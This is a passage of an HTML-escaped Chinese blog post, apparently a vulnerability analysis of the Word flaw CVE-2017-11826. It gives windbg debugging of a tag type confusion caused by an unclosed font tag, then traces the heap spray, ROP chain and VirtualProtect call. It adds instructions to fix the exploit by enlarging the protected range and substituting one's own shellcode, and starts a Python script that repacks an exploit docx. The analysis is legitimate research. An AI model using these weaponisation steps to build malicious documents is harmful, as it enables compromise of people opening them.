+&lt;p&gt;可以看到v3就是xml文件中的标签，在解析到idmp标签后程序崩溃，然而并没有看到font标签，于是寻找到崩溃函数的父函数sub_3170FA5A&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802163044663.png&quot; alt=&quot;image-20210802163044663&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;崩溃函数arg2的值为edi，而edi的值为父函数的arg2：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802165001758.png&quot; alt=&quot;image-20210802165001758&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;于是在父函数和崩溃函数同时下断，查看标签解析情况：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bp wwlib+3fa5a &quot;.printf \&quot;Parent_Func:	\&quot;; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;&quot;
+bp wwlib+385ce6 &quot;.printf \&quot;Crash_Func:	\&quot;; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802170632918.png&quot; alt=&quot;image-20210802170632918&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在父函数成功解析到font标签，猜测因为font标签未闭合而导致崩溃函数解析标签出错产生漏洞，修改了xml文件闭合了font标签：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804145041151.png&quot; alt=&quot;image-20210804145041151&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;将修改后的docx文件嵌入到新建的rtf文件中，在windbg中调试后发现eax的值改变了，并且没有异常，证实因为font标签未闭合导致的漏洞。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802180616278.png&quot; alt=&quot;image-20210802180616278&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续调试发现异常触发点的eax和ecx都是来自于esi，而esi为漏洞函数的arg1：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803145832128.png&quot; alt=&quot;image-20210803145832128&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此在漏洞函数打印标签以及[[esi+17f0]]、[[esi+17f0]+8]、[[esi+17f0]+c]和[esi+17f0]的值：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bp wwlib+385ce6 &quot;du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); r $t0=poi(poi(esp+4)+17f0); dd poi($t0) L1; dd poi($t0)+8 L1; dd poi($t0)+c L1; dd $t0 L1; .printf\&quot;\\n\&quot;; g;&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803162436403.png&quot; alt=&quot;image-20210803162436403&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;打印出的结构就是Taglist结构体，具体结构参考goabout2的&lt;a href=&quot;https://www.cnblogs.com/goabout2/p/8186018.html&quot;&gt;office CVE-2017-11826杂谈&lt;/a&gt;一文。&lt;/p&gt;
+
+&lt;p&gt;接着调试异常触发点上的函数，发现函数功能为通过层级标签获取TagObject Array[Index-2]：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803192637477.png&quot; alt=&quot;image-20210803192637477&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续向上追溯，发现函数GetTagObject也调用了GetTagObjectByIndex，通过分析发现该函数获取的是TagObject Array[Index-1]的地址：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803193709068.png&quot; alt=&quot;image-20210803193709068&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;分析到这里，漏洞产生的原因也就出来了，由于word每解析一个标签，Current_Index的值就加一，当解析到闭合标签，Current_Index值会减1。由于构造了没有闭合的font标签，因此导致在解析idmap标签时比正常文件的Current_Index多一，导致原本应该获取OLEObject标签的TagObject变成获取了font的TagObject，因此造成了标签类型混淆导致漏洞的发生。&lt;/p&gt;
+
+&lt;p&gt;将标签层级和xml文件标签对应：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803164645125.png&quot; alt=&quot;image-20210803164645125&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以证实确实因为Current_Index值比正常文件的多一导致的类型混淆。&lt;/p&gt;
+
+&lt;p&gt;在内存中查看当解析idmap层级为6时Taglist的内存结构：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; bp wwlib+4da16b
+&amp;gt; g
+Breakpoint 1 hit
+eax=070f1800 ebx=00000000 ecx=0225466c edx=00000004 esi=0225466c edi=070f19dc
+eip=6f95a16b esp=002cf428 ebp=002cf490 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+wwlib!DllGetLCID+0x2cc775:
+6f95a16b e840f7b2ff      call    wwlib!DllGetClassObject+0x42d4 (6f4898b0)
+&amp;gt; ub $ip L8
+wwlib!DllGetLCID+0x2cc75d:
+6f95a153 83780401        cmp     dword ptr [eax+4],1
+6f95a157 0f85f5bdeaff    jne     wwlib!DllGetLCID+0x17855c (6f805f52)
+6f95a15d 8bb6f0170000    mov     esi,dword ptr [esi+17F0h]
+6f95a163 8b06            mov     eax,dword ptr [esi]
+6f95a165 8b10            mov     edx,dword ptr [eax]
+6f95a167 4a              dec     edx
+6f95a168 4a              dec     edx
+6f95a169 8bce            mov     ecx,esi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;此时eax的值即为Taglist，因此查看eax指向的Taglist结构：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803215207578.png&quot; alt=&quot;image-20210803215207578&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此时TagObject[4]+0x44的值为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x090b4000&lt;/code&gt;，查看该值在内存中存储的数据：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803213913808.png&quot; alt=&quot;image-20210803213913808&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;发现[[TagObject[4]+0x44]+0x44]的值正是xml文件中font标签构造的固定地址，自此漏洞部分分析完毕。&lt;/p&gt;
+
+&lt;h2 id=&quot;漏洞利用&quot;&gt;漏洞利用&lt;/h2&gt;
+
+&lt;p&gt;先启动word然后使用windbg附加会导致堆喷无法成功，继而无法分析漏洞利用部分。因此使用gflags.exe让调试器直接加载winword.exe：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803220115994.png&quot; alt=&quot;image-20210803220115994&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;设置断点在异常触发点：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; bp wwlib+4da184
+&amp;gt; g
+Breakpoint 0 hit
+eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004b44b4 edi=0340cddc
+eip=6e2da184 esp=002f5f14 ebp=002f5f7c iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+wwlib!DllGetLCID+0x2cc78e:
+6e2da184 50              push    eax
+0:000&amp;gt; u $ip
+wwlib!DllGetLCID+0x2cc78e:
+6e2da184 50              push    eax
+6e2da185 ff5104          call    dword ptr [ecx+4]
+6e2da188 e9fabdeaff      jmp     wwlib!DllGetLCID+0x178591 (6e185f87)
+6e2da18d 83f802          cmp     eax,2
+6e2da190 750f            jne     wwlib!DllGetLCID+0x2cc7ab (6e2da1a1)
+6e2da192 83c624          add     esi,24h
+6e2da195 56              push    esi
+6e2da196 52              push    edx
+&amp;gt; dd ecx+4
+088883f0  72980e2b 72980e2b 72980e2b 72980e2b
+08888400  72980e2b 72980e2b 72980e2b 72980e2b
+08888410  72980e2b 72980e2b 72980e2b 72980e2b
+08888420  72980e2b 72980e2b 72980e2b 72980e2b
+08888430  72980e2b 72980e2b 72980e2b 72980e2b
+08888440  72980e2b 72980e2b 72980e2b 72980e2b
+08888450  72980e2b 72980e2b 72980e2b 72980e2b
+08888460  72980e2b 72980e2b 72980e2b 72980e2b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;发现exc+4的值为activeX1.bin中shellcode下方的填充，说明已经成功堆喷。&lt;/p&gt;
+
+&lt;p&gt;步入[exc+4]后发现来到了msvbvm60.dll，已经进入了ROP链：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; t
+eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004c44b4 edi=0043cddc
+eip=72980e2b esp=00385a18 ebp=00385a88 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+msvbvm60!IID_IVbaHost+0x127eb:
+72980e2b 94              xchg    eax,esp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;而第一条指令则是用来栈迁移，在之前已经将eax入栈，而eax的值正是构造好的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x088888ec&lt;/code&gt;，执行指令后，esp的值已经变成了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x088888ec&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803223544350.png&quot; alt=&quot;image-20210803223544350&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;而eax中的内容刚好位于shellcode的上方，此时ROP链为滑板指令，循环执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop eax&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;，此时可以下断&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bp 729440cc &quot;.if(esp=08888f48){}.else{gc}&quot;&lt;/code&gt;停在了滑板指令结束的位置：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804102057063.png&quot; alt=&quot;image-20210804102057063&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当执行到最后一次滑板指令时，会将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x729410d0&lt;/code&gt;放入eax中，而该值是msvbvm60.dll的IAT表中的数据，查看后存储的是VirtualProtect的地址：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804103009190.png&quot; alt=&quot;image-20210804103009190&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;紧接着通过ret跳转到ROP指令&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp [eax]&lt;/code&gt;执行VirtualProtect，而此时栈中为构造好的VirtualProtect的参数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104003516.png&quot; alt=&quot;image-20210804104003516&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再次跳转后进入到kernelbase.dll的VirtualProtect：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104216392.png&quot; alt=&quot;image-20210804104216392&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;执行后会跳转到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08888f70&lt;/code&gt;执行shellcode：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104652987.png&quot; alt=&quot;image-20210804104652987&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然而VirtualProtect的修改的内存范围只有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08888c90 - 0x08888e91&lt;/code&gt;，而shellcode却位于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08888f70&lt;/code&gt;，因此会触发c0000005访问异常，shellcode执行失败：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804105857160.png&quot; alt=&quot;image-20210804105857160&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;利用改造&quot;&gt;利用改造&lt;/h2&gt;
+
+&lt;p&gt;activeX1.bin文件中布局如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804115244951.png&quot; alt=&quot;image-20210804115244951&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于原本VirtualProtect修改的范围为0x201不够，因此修改为0x1000确保能够覆盖shellcode，随后将shellcode替换为自己的shellcode即可。&lt;/p&gt;
+
+&lt;p&gt;将修改好的activeX1.bin文件替换到rtfobj.py提取出来进行堆喷的文档中，并修改为.docx，脚本参考&lt;a href=&quot;https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/&quot;&gt;Exploiting Word: CVE-2017-11826&lt;/a&gt;一文，替换脚本如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;shutil&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;zipfile&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;template_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;final_docx_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;activeX_bin_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pack_file_to_open_xml_docx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_docx_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activeX_bin_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; 
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activeX_bin_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Template docx file or activeX.bin file not exist.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activeX_bin_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+        &lt;span class=&quot;n&quot;&gt;object_bin_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;zip_docx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;template_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;.zip&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;current_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zip_docx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; 
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;shutil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;zip_docx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_path&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# open temp docx and a copy for modification 
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;zin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zip_docx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;r&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;zip_docx_copy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zip_docx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;_copy_&quot;&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;zout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zip_docx_copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# modify the docx template with exploit 
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;infolist&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;activeX1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;zout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;writestr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# use existing file
+&lt;/span&gt;            
